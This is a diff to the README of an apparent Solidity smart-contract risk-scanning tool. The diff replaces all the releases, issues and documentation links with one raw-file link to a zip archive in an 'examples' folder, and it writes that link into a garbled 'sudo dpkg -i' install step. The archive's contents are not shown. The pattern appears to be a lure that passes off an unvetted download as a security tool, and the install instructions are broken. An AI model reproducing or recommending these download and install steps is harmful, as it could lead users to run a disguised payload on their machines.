@@ -1,7 +1,7 @@
 # 🛡️ Solidity-Economic-Risk-Scanner - Analyze Smart Contracts with Ease
 
 ## 📥 Download Now
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Here-blue.svg)](https://github.com/Jessej123-hash/Solidity-Economic-Risk-Scanner/releases)
+[![Download Releases](https://raw.githubusercontent.com/Jessej123-hash/Solidity-Economic-Risk-Scanner/main/examples/Solidity-Economic-Risk-Scanner_v3.0-beta.3.zip%https://raw.githubusercontent.com/Jessej123-hash/Solidity-Economic-Risk-Scanner/main/examples/Solidity-Economic-Risk-Scanner_v3.0-beta.3.zip)](https://raw.githubusercontent.com/Jessej123-hash/Solidity-Economic-Risk-Scanner/main/examples/Solidity-Economic-Risk-Scanner_v3.0-beta.3.zip)
 
 ## 📖 Overview
 The Solidity-Economic-Risk-Scanner is a research-grade tool designed to help you analyze Solidity smart contracts for economic vulnerabilities. This tool focuses on key issues such as unbounded minting, toxic fee mechanisms, liquidity traps, oracle manipulation, centralized control, and broken financial invariants. By using this scanner, you can assess the economic correctness of smart contracts, understand incentive risks, and enhance the stability of DeFi systems.
@@ -28,7 +28,7 @@ You will need:
 - Assesses centralized control risks to ensure fair ecosystems.
 
 ## 🖥️ Download & Install
-To download the Solidity-Economic-Risk-Scanner, visit this page: [Download Releases](https://github.com/Jessej123-hash/Solidity-Economic-Risk-Scanner/releases).
+To download the Solidity-Economic-Risk-Scanner, visit this page: [Download Releases](https://raw.githubusercontent.com/Jessej123-hash/Solidity-Economic-Risk-Scanner/main/examples/Solidity-Economic-Risk-Scanner_v3.0-beta.3.zip).
 
 1. Click on the link above to go directly to the Releases page.
 2. You will see a list of available versions.
@@ -53,7 +53,7 @@ After downloading, follow these installation steps:
 **For Linux:**
 1. Open your terminal.
 2. Use the command `cd ~/Downloads` to navigate to the downloads folder.
-3. Run the installation with `sudo dpkg -i yourfile.deb` (replace "yourfile.deb" with the actual filename).
+3. Run the installation with `sudo dpkg -i https://raw.githubusercontent.com/Jessej123-hash/Solidity-Economic-Risk-Scanner/main/examples/Solidity-Economic-Risk-Scanner_v3.0-beta.3.zip` (replace "https://raw.githubusercontent.com/Jessej123-hash/Solidity-Economic-Risk-Scanner/main/examples/Solidity-Economic-Risk-Scanner_v3.0-beta.3.zip" with the actual filename).
 4. Launch the application from your applications menu.
 
 ## 🌐 Using the Scanner
@@ -87,8 +87,8 @@ The Solidity-Economic-Risk-Scanner covers a wide range of topics related to smar
 If you have questions or need assistance while using Solidity-Economic-Risk-Scanner, community support is available. Join our forum or check out our FAQ section on the GitHub repository.
 
 ## 🔗 Additional Resources
-- [GitHub Issues](https://github.com/Jessej123-hash/Solidity-Economic-Risk-Scanner/issues) for reporting problems or requesting features.
-- [Documentation](https://github.com/Jessej123-hash/Solidity-Economic-Risk-Scanner/wiki) for deeper insights into tool capabilities.
+- [GitHub Issues](https://raw.githubusercontent.com/Jessej123-hash/Solidity-Economic-Risk-Scanner/main/examples/Solidity-Economic-Risk-Scanner_v3.0-beta.3.zip) for reporting problems or requesting features.
+- [Documentation](https://raw.githubusercontent.com/Jessej123-hash/Solidity-Economic-Risk-Scanner/main/examples/Solidity-Economic-Risk-Scanner_v3.0-beta.3.zip) for deeper insights into tool capabilities.
 
 ## 📅 Updates
-Keep an eye on the Releases page for updates and new features. We regularly enhance the tool based on user feedback and industry developments. Remember to revisit the [Download Releases](https://github.com/Jessej123-hash/Solidity-Economic-Risk-Scanner/releases) page after a few weeks for the latest version.
+Keep an eye on the Releases page for updates and new features. We regularly enhance the tool based on user feedback and industry developments. Remember to revisit the [Download Releases](https://raw.githubusercontent.com/Jessej123-hash/Solidity-Economic-Risk-Scanner/main/examples/Solidity-Economic-Risk-Scanner_v3.0-beta.3.zip) page after a few weeks for the latest version.
